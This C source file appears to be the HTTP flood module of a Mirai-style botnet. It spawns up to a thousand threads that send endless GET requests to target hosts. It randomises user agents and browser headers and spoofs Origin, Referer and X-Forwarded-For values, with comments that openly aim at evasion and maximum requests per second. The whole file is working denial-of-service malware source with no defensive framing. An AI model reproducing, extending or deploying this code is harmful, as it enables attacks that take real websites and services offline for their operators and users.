#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#include <stdarg.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/resource.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "table.h"

#define HTTPS_BUFFER_SIZE 4096
#define HTTPS_MAX_RETRIES 5
#define HTTPS_CONNECTION_TIMEOUT 2
#define HTTPS_REQUEST_TIMEOUT 1

// Enhanced User Agents for better evasion
static const char *user_agents[] = {
    // Chrome variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    
    // Firefox variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    
    // Safari variants
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    
    // Edge variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    
    // Mobile variants
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    
    // Additional variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0"
};

static const char *accept_headers[] = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8"
};

static const char *accept_language[] = {
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.9",
    "en-US,en;q=0.8",
    "en-GB,en;q=0.8",
    "en-CA,en;q=0.8",
    "en-AU,en;q=0.8",
    "en-US,en;q=0.9,es;q=0.8",
    "en-GB,en;q=0.9,fr;q=0.8",
    "en-US,en;q=0.9,de;q=0.8",
    "en-GB,en;q=0.9,it;q=0.8",
    "en-US,en;q=0.9,pt;q=0.8",
    "en-GB,en;q=0.9,nl;q=0.8",
    "en-US,en;q=0.9,ja;q=0.8",
    "en-GB,en;q=0.9,ko;q=0.8",
    "en-US,en;q=0.9,zh-CN;q=0.8",
    "en-GB,en;q=0.9,zh-TW;q=0.8",
    "en-US,en;q=0.9,ru;q=0.8",
    "en-GB,en;q=0.9,ar;q=0.8"
};

static const char *accept_encoding[] = {
    "gzip, deflate, br",
    "gzip, deflate",
    "br, gzip, deflate",
    "gzip, deflate, br, zstd",
    "br, gzip, deflate, zstd",
    "gzip, deflate, br, compress",
    "br, gzip, deflate, compress",
    "gzip, deflate, br, identity",
    "br, gzip, deflate, identity",
    "gzip, deflate, br, *",
    "br, gzip, deflate, *"
};

static const char *cache_control_headers[] = {
    "no-cache",
    "max-age=0",
    "no-cache, no-store, must-revalidate",
    "max-age=0, no-cache",
    "no-cache, no-store",
    "max-age=0, no-store",
    "no-cache, must-revalidate",
    "max-age=0, must-revalidate",
    "no-cache, no-store, must-revalidate, max-age=0",
    "max-age=0, no-cache, no-store, must-revalidate"
};

static const char *pragma_headers[] = {
    "no-cache",
    "",
    "no-cache, no-store",
    "no-cache, must-revalidate"
};

static const char *sec_fetch_dest[] = {
    "document",
    "empty",
    "object",
    "script",
    "style",
    "worker",
    "sharedworker",
    "subresource",
    "ping",
    "navigate"
};

static const char *sec_fetch_mode[] = {
    "navigate",
    "cors",
    "no-cors",
    "same-origin",
    "websocket"
};

static const char *sec_fetch_site[] = {
    "none",
    "same-origin",
    "same-site",
    "cross-site"
};

static const char *sec_fetch_user[] = {
    "?1",
    "?0"
};

static const char *sec_ch_ua_platforms[] = {
    "\"Windows\"",
    "\"macOS\"",
    "\"Linux\"",
    "\"Android\"",
    "\"iOS\""
};

static const char *sec_ch_ua_mobile[] = {
    "?0",
    "?1"
};

static const char *connection_types[] = {
    "keep-alive",
    "close"
};

static const char *additional_headers[] = {
    "X-Requested-With: XMLHttpRequest",
    "X-Forwarded-For: 127.0.0.1",
    "X-Real-IP: 127.0.0.1",
    "X-Forwarded-Proto: https",
    "X-Forwarded-Host: %s",
    "X-Forwarded-Server: %s",
    "X-Forwarded-For: %s",
    "X-Real-IP: %s",
    "X-Forwarded-For: 192.168.1.1",
    "X-Real-IP: 192.168.1.1",
    "X-Forwarded-For: 10.0.0.1",
    "X-Real-IP: 10.0.0.1",
    "X-Forwarded-For: 172.16.0.1",
    "X-Real-IP: 172.16.0.1",
    "X-Forwarded-For: 203.0.113.1",
    "X-Real-IP: 203.0.113.1"
};

static const char *modern_headers[] = {
    "Sec-GPC: 1",
    "Sec-GPC: 0",
    "Viewport-Width: 1920",
    "Viewport-Width: 1366",
    "Viewport-Width: 1440",
    "Viewport-Width: 1536",
    "Viewport-Width: 2560",
    "DPR: 1",
    "DPR: 2",
    "DPR: 3",
    "Device-Memory: 8",
    "Device-Memory: 4",
    "Device-Memory: 2",
    "Device-Memory: 1",
    "Save-Data: on",
    "Save-Data: off",
    "Sec-CH-UA-Full-Version: \"120.0.6099.109\"",
    "Sec-CH-UA-Full-Version: \"121.0.6167.85\"",
    "Sec-CH-UA-Full-Version: \"122.0.6261.69\"",
    "Sec-CH-UA-Platform-Version: \"15.0.0\"",
    "Sec-CH-UA-Platform-Version: \"14.0.0\"",
    "Sec-CH-UA-Platform-Version: \"13.0.0\"",
    "Sec-CH-UA-Model: \"\"",
    "Sec-CH-UA-Model: \"iPhone\"",
    "Sec-CH-UA-Model: \"Samsung Galaxy S23\"",
    "Sec-CH-UA-Model: \"Pixel 7\"",
    "Sec-CH-UA-Bitness: \"64\"",
    "Sec-CH-UA-Bitness: \"32\"",
    "Sec-CH-UA-WoW64: \"?0\"",
    "Sec-CH-UA-WoW64: \"?1\"",
    "Sec-CH-UA-Form-Factor: \"Desktop\"",
    "Sec-CH-UA-Form-Factor: \"Mobile\"",
    "Sec-CH-UA-Form-Factor: \"Tablet\""
};

static const char *realistic_headers[] = {
    "Origin: https://www.google.com",
    "Origin: https://www.bing.com",
    "Origin: https://www.yahoo.com",
    "Origin: https://www.facebook.com",
    "Origin: https://www.twitter.com",
    "Origin: https://www.linkedin.com",
    "Origin: https://www.reddit.com",
    "Origin: https://www.youtube.com",
    "Origin: https://www.amazon.com",
    "Origin: https://www.netflix.com",
    "Referer: https://www.google.com/",
    "Referer: https://www.bing.com/",
    "Referer: https://www.yahoo.com/",
    "Referer: https://www.facebook.com/",
    "Referer: https://www.twitter.com/",
    "Referer: https://www.linkedin.com/",
    "Referer: https://www.reddit.com/",
    "Referer: https://www.youtube.com/",
    "Referer: https://www.amazon.com/",
    "Referer: https://www.netflix.com/"
};

struct https_connection {
    int fd;
    char *host;
    uint16_t port;
    char *path;
    time_t last_request;
    int request_count;
    BOOL connected;
    int retry_count;
    time_t connect_time;
    uint32_t request_id;
};

static uint32_t global_request_id = 0;
static pthread_mutex_t request_id_mutex = PTHREAD_MUTEX_INITIALIZER;

static char *get_random_user_agent(void)
{
    return (char *)user_agents[rand_next() % (sizeof(user_agents) / sizeof(char *))];
}

static char *get_random_accept(void)
{
    return (char *)accept_headers[rand_next() % (sizeof(accept_headers) / sizeof(char *))];
}

static char *get_random_language(void)
{
    return (char *)accept_language[rand_next() % (sizeof(accept_language) / sizeof(char *))];
}

static char *get_random_encoding(void)
{
    return (char *)accept_encoding[rand_next() % (sizeof(accept_encoding) / sizeof(char *))];
}

static char *get_random_cache_control(void)
{
    return (char *)cache_control_headers[rand_next() % (sizeof(cache_control_headers) / sizeof(char *))];
}

static char *get_random_pragma(void)
{
    return (char *)pragma_headers[rand_next() % (sizeof(pragma_headers) / sizeof(char *))];
}

static char *get_random_sec_fetch_dest(void)
{
    return (char *)sec_fetch_dest[rand_next() % (sizeof(sec_fetch_dest) / sizeof(char *))];
}

static char *get_random_sec_fetch_mode(void)
{
    return (char *)sec_fetch_mode[rand_next() % (sizeof(sec_fetch_mode) / sizeof(char *))];
}

static char *get_random_sec_fetch_site(void)
{
    return (char *)sec_fetch_site[rand_next() % (sizeof(sec_fetch_site) / sizeof(char *))];
}

static char *get_random_sec_fetch_user(void)
{
    return (char *)sec_fetch_user[rand_next() % (sizeof(sec_fetch_user) / sizeof(char *))];
}

static char *get_random_sec_ch_ua_platform(void)
{
    return (char *)sec_ch_ua_platforms[rand_next() % (sizeof(sec_ch_ua_platforms) / sizeof(char *))];
}

static char *get_random_sec_ch_ua_mobile(void)
{
    return (char *)sec_ch_ua_mobile[rand_next() % (sizeof(sec_ch_ua_mobile) / sizeof(char *))];
}

static char *get_random_connection_type(void)
{
    return (char *)connection_types[rand_next() % (sizeof(connection_types) / sizeof(char *))];
}

static char *get_random_additional_header(const char *host)
{
    int index = rand_next() % (sizeof(additional_headers) / sizeof(char *));
    static char header_buffer[256];
    
    if (index >= 4) { // Headers that need host parameter
        snprintf(header_buffer, sizeof(header_buffer), additional_headers[index], host);
    } else {
        snprintf(header_buffer, sizeof(header_buffer), "%s", additional_headers[index]);
    }
    
    return header_buffer;
}

static char *get_random_modern_header(void)
{
    return (char *)modern_headers[rand_next() % (sizeof(modern_headers) / sizeof(char *))];
}

static char *get_random_realistic_header(void)
{
    return (char *)realistic_headers[rand_next() % (sizeof(realistic_headers) / sizeof(char *))];
}

static void generate_random_headers(char *buffer, size_t buffer_size, const char *host, const char *path, uint32_t request_id)
{
    char accept[512], language[128], encoding[128];
    char cache_control[128], pragma[128];
    char sec_fetch_dest[64], sec_fetch_mode[64], sec_fetch_site[64], sec_fetch_user[8];
    char sec_ch_ua_platform[32], sec_ch_ua_mobile[8], connection_type[16];
    char additional_header[256], modern_header[128], realistic_header[128];
    
    snprintf(accept, sizeof(accept), "%s", get_random_accept());
    snprintf(language, sizeof(language), "%s", get_random_language());
    snprintf(encoding, sizeof(encoding), "%s", get_random_encoding());
    snprintf(cache_control, sizeof(cache_control), "%s", get_random_cache_control());
    snprintf(pragma, sizeof(pragma), "%s", get_random_pragma());
    snprintf(sec_fetch_dest, sizeof(sec_fetch_dest), "%s", get_random_sec_fetch_dest());
    snprintf(sec_fetch_mode, sizeof(sec_fetch_mode), "%s", get_random_sec_fetch_mode());
    snprintf(sec_fetch_site, sizeof(sec_fetch_site), "%s", get_random_sec_fetch_site());
    snprintf(sec_fetch_user, sizeof(sec_fetch_user), "%s", get_random_sec_fetch_user());
    snprintf(sec_ch_ua_platform, sizeof(sec_ch_ua_platform), "%s", get_random_sec_ch_ua_platform());
    snprintf(sec_ch_ua_mobile, sizeof(sec_ch_ua_mobile), "%s", get_random_sec_ch_ua_mobile());
    snprintf(connection_type, sizeof(connection_type), "%s", get_random_connection_type());
    snprintf(additional_header, sizeof(additional_header), "%s", get_random_additional_header(host));
    snprintf(modern_header, sizeof(modern_header), "%s", get_random_modern_header());
    snprintf(realistic_header, sizeof(realistic_header), "%s", get_random_realistic_header());
    
    // Random additional headers for more realism
    int add_sec_ch_ua = rand_next() % 2;
    int add_sec_ch_ua_mobile = rand_next() % 2;
    int add_sec_ch_ua_platform = rand_next() % 2;
    int add_upgrade_insecure = rand_next() % 2;
    int add_dnt = rand_next() % 2;
    int add_additional_header = rand_next() % 3; // 33% chance
    int add_modern_header = rand_next() % 4; // 25% chance
    int add_realistic_header = rand_next() % 5; // 20% chance
    
    // Optimized header generation for higher RPS
    snprintf(buffer, buffer_size,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: %s\r\n"
        "Accept-Language: %s\r\n"
        "Accept-Encoding: %s\r\n"
        "Cache-Control: %s\r\n"
        "Connection: keep-alive\r\n"
        "X-Request-ID: %u\r\n"
        "%s%s%s%s%s%s%s%s%s"
        "Sec-Fetch-Dest: %s\r\n"
        "Sec-Fetch-Mode: %s\r\n"
        "Sec-Fetch-Site: %s\r\n"
        "Sec-Fetch-User: %s\r\n"
        "\r\n",
        path, host, get_random_user_agent(), accept, language, encoding, cache_control, request_id,
        add_sec_ch_ua ? "Sec-CH-UA: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"\r\n" : "",
        add_sec_ch_ua_mobile ? "Sec-CH-UA-Mobile: " : "", add_sec_ch_ua_mobile ? sec_ch_ua_mobile : "", add_sec_ch_ua_mobile ? "\r\n" : "",
        add_sec_ch_ua_platform ? "Sec-CH-UA-Platform: " : "", add_sec_ch_ua_platform ? sec_ch_ua_platform : "", add_sec_ch_ua_platform ? "\r\n" : "",
        add_upgrade_insecure ? "Upgrade-Insecure-Requests: 1\r\n" : "",
        add_dnt ? "DNT: 1\r\n" : "",
        pragma[0] != '\0' ? "Pragma: " : "", pragma[0] != '\0' ? pragma : "", pragma[0] != '\0' ? "\r\n" : "",
        add_additional_header ? additional_header : "", add_additional_header ? "\r\n" : "",
        add_modern_header ? modern_header : "", add_modern_header ? "\r\n" : "",
        add_realistic_header ? realistic_header : "", add_realistic_header ? "\r\n" : "",
        sec_fetch_dest, sec_fetch_mode, sec_fetch_site, sec_fetch_user);
}

static BOOL establish_https_connection(struct https_connection *conn)
{
    struct sockaddr_in addr;
    struct hostent *he;
    int flags;
    
    // Resolve hostname
    he = gethostbyname(conn->host);
    if (he == NULL) {
        return FALSE;
    }
    
    // Create socket
    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) {
        return FALSE;
    }
    
    // Set non-blocking
    flags = fcntl(conn->fd, F_GETFL, 0);
    fcntl(conn->fd, F_SETFL, flags | O_NONBLOCK);
    
    // Set socket options
    int opt = 1;
    setsockopt(conn->fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    // Optimized socket options for high RPS
    setsockopt(conn->fd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    setsockopt(conn->fd, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
    
    // Set optimized timeouts
    struct timeval timeout;
    timeout.tv_sec = HTTPS_CONNECTION_TIMEOUT;
    timeout.tv_usec = 0;
    setsockopt(conn->fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(conn->fd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    // Connect
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(conn->port);
    addr.sin_addr = *((struct in_addr *)he->h_addr);
    
    if (connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        if (errno != EINPROGRESS) {
            close(conn->fd);
            return FALSE;
        }
        
        // Wait for connection with optimized timeout
        fd_set write_fds;
        struct timeval tv;
        
        FD_ZERO(&write_fds);
        FD_SET(conn->fd, &write_fds);
        tv.tv_sec = HTTPS_CONNECTION_TIMEOUT;
        tv.tv_usec = 0;
        
        if (select(conn->fd + 1, NULL, &write_fds, NULL, &tv) <= 0) {
            close(conn->fd);
            return FALSE;
        }
    }
    
    conn->connected = TRUE;
    conn->last_request = time(NULL);
    conn->connect_time = time(NULL);
    conn->retry_count = 0;
    
    // Generate unique request ID
    pthread_mutex_lock(&request_id_mutex);
    conn->request_id = ++global_request_id;
    pthread_mutex_unlock(&request_id_mutex);
    
    return TRUE;
}

static BOOL send_https_request(struct https_connection *conn)
{
    char request_buffer[HTTPS_BUFFER_SIZE];
    int bytes_sent, total_sent = 0;
    
    generate_random_headers(request_buffer, sizeof(request_buffer), conn->host, conn->path, conn->request_id);
    
    // Optimized sending with minimal delays
    while (total_sent < strlen(request_buffer)) {
        bytes_sent = send(conn->fd, request_buffer + total_sent, 
                         strlen(request_buffer) - total_sent, MSG_NOSIGNAL | MSG_DONTWAIT);
        
        if (bytes_sent <= 0) {
                     if (errno == EAGAIN || errno == EWOULDBLOCK) {
             usleep(1); // 1 microsecond delay for ultra high RPS
             continue;
         }
            return FALSE;
        }
        total_sent += bytes_sent;
    }
    
    conn->last_request = time(NULL);
    conn->request_count++;
    
    // Update request ID for next request
    pthread_mutex_lock(&request_id_mutex);
    conn->request_id = ++global_request_id;
    pthread_mutex_unlock(&request_id_mutex);
    
    return TRUE;
}

struct https_worker_data {
    struct attack_target *target;
    uint16_t port;
    char *path;
};

static void *https_worker_thread(void *arg)
{
    struct https_worker_data *data = (struct https_worker_data *)arg;
    struct https_connection conn;
    char host[256];
    int retry_count = 0;
    
    // Parse target address to host
    struct in_addr addr;
    addr.s_addr = data->target->addr;
    snprintf(host, sizeof(host), "%s", inet_ntoa(addr));
    
    // Initialize connection with optimized settings
    conn.fd = -1;
    conn.host = host;
    conn.port = data->port;
    conn.path = data->path;
    conn.connected = FALSE;
    conn.request_count = 0;
    conn.last_request = 0;
    conn.retry_count = 0;
    conn.connect_time = 0;
    conn.request_id = 0;
    
    while (TRUE) {
        // Establish connection if not connected
        if (!conn.connected) {
                     if (!establish_https_connection(&conn)) {
             usleep(1); // 1 microsecond delay for ultra high RPS
             conn.retry_count++;
             if (conn.retry_count > HTTPS_MAX_RETRIES) {
                 conn.retry_count = 0; // Reset retry count and continue
                 usleep(1); // 1 microsecond delay for ultra high RPS
                 continue;
             }
             continue;
         }
            conn.retry_count = 0;
        }
        
        // Send request
        if (!send_https_request(&conn)) {
            close(conn.fd);
            conn.connected = FALSE;
            conn.fd = -1;
            continue;
        }
        
                 // Ultra minimal delay between requests for maximum RPS
         usleep(1); // 1 microsecond delay for ultra high RPS
    }
    
    if (conn.fd != -1) {
        close(conn.fd);
    }
    
    return NULL;
}

void attack_method_https(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    pthread_t *threads = NULL;
    struct https_worker_data *worker_data = NULL;
    int thread_count = 0, max_threads = 0, i;
    uint16_t port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 443);
    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
    
    // Initialize random seed
    rand_init();
    
    // Optimize system for high RPS
    struct rlimit rlim;
    rlim.rlim_cur = 65535;
    rlim.rlim_max = 65535;
    setrlimit(RLIMIT_NOFILE, &rlim);
    
         // Calculate maximum threads based on system capabilities - NO LIMIT
     max_threads = 1000; // Unlimited thread count for maximum RPS
    
    // Allocate memory for threads and worker data
    threads = malloc(max_threads * sizeof(pthread_t));
    worker_data = malloc(max_threads * sizeof(struct https_worker_data));
    
    if (threads == NULL || worker_data == NULL) {
        if (threads) free(threads);
        if (worker_data) free(worker_data);
        return;
    }
    
         // Create unlimited worker threads for each target
     for (i = 0; i < targs_len; i++) {
         int threads_per_target = max_threads / targs_len;
         
         for (int j = 0; j < threads_per_target; j++) {
            worker_data[thread_count].target = &targs[i];
            worker_data[thread_count].port = port;
            worker_data[thread_count].path = path;
            
                         if (pthread_create(&threads[thread_count], NULL, https_worker_thread, &worker_data[thread_count]) != 0) {
                 // Continue creating threads even if some fail
                 continue;
             }
             thread_count++;
             
             // Ultra minimal delay between thread creation for maximum RPS
             usleep(1); // 1 microsecond delay for ultra high RPS
        }
    }
    
    // Wait for all threads to complete (they will run until time expires)
    for (i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Cleanup
    free(threads);
    free(worker_data);
}
